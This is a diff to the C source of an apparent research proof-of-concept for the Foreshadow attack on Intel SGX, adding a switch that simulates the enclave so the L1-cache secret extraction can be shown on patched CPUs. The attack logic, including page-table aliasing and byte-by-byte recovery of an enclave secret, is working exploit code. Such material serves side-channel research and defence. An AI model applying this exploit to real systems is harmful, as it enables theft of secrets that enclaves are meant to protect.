@@ -43,6 +43,11 @@
 #define ENCLAVE_SO	"Enclave/encl.so"
 #define ENCLAVE_MODE 	DEBUG_ENCLAVE
 
+#define SIM_ENCLAVE         0       /* PoC without EENTER to demonstrate FS on CPUs with patched ucode */
+#if SIM_ENCLAVE
+    #include "sim-enclave.c"
+#endif
+
 void *secret_ptr = NULL, *secret_page = NULL, *alias_ptr = NULL, *ssa_gprsgx = NULL, *alias_ssa_gprsgx = NULL;
 uint64_t *pte_alias = NULL, *pte_alias_gprsgx = NULL;
 uint64_t pte_alias_unmapped = 0x0;
@@ -89,8 +94,10 @@ void attacker_config_runtime(void)
     ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
     ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
 
+#if !SIM_ENCLAVE
     register_enclave_info();
     print_enclave_info();
+#endif
 }
 
 void unmap_alias(void)
@@ -105,7 +112,11 @@ void unmap_alias(void)
 void attacker_config_page_table(void)
 {
     /* benchmark enclave trigger page and SSA frame addresses */
-    SGX_ASSERT( enclave_generate_secret( eid, &secret_ptr) );
+    #if SIM_ENCLAVE
+        secret_ptr = sim_generate_secret();
+    #else
+        SGX_ASSERT( enclave_generate_secret( eid, &secret_ptr) );
+    #endif
 	secret_page = (void *)( (uint64_t) secret_ptr & ~UINT64_C(0xfff) );
 
     /* establish independent virtual alias mapping for enclave secret */
@@ -148,9 +159,11 @@ int main( int argc, char **argv )
     uint8_t real[SECRET_BYTES] = {0x0};
     uint8_t recovered[SECRET_BYTES] = {0x0};
     
-    info("Creating enclave...");
-    SGX_ASSERT( sgx_create_enclave( ENCLAVE_SO, ENCLAVE_MODE,
-                                    &token, &updated, &eid, NULL ) );
+    #if !SIM_ENCLAVE
+        info("Creating enclave...");
+        SGX_ASSERT( sgx_create_enclave( ENCLAVE_SO, ENCLAVE_MODE,
+                                        &token, &updated, &eid, NULL ) );
+    #endif
 
     /* configure attack untrusted runtime */
     attacker_config_runtime();
@@ -160,7 +173,11 @@ int main( int argc, char **argv )
     /* enter enclave and extract secrets */
     info_event("Foreshadow secret extraction");
     info("prefetching enclave secret (EENTER/EEXIT)...");
-	SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
+    #if SIM_ENCLAVE
+        sim_reload( secret_ptr );
+    #else
+        SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
+    #endif
 
     info("extracting secret from L1 cache..");
     for (i=0; i < SECRET_BYTES; i++)
@@ -169,13 +186,21 @@ int main( int argc, char **argv )
             unmap_alias();
         #endif
         #if ITER_RELOAD
-            SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
+            #if SIM_ENCLAVE
+                sim_reload( secret_ptr );
+            #else
+                SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
+            #endif
         #endif
         recovered[i] = foreshadow(alias_ptr+i);
     }
 
     info("verifying and destroying enclave secret..");
-	SGX_ASSERT( enclave_destroy_secret( eid, real) );
+    #if SIM_ENCLAVE
+	    sim_destroy_secret( real);
+    #else
+	    SGX_ASSERT( enclave_destroy_secret( eid, real) );
+    #endif
     foreshadow_compare_secret(recovered, real, SECRET_BYTES);
 
     #if DUMP_SSA
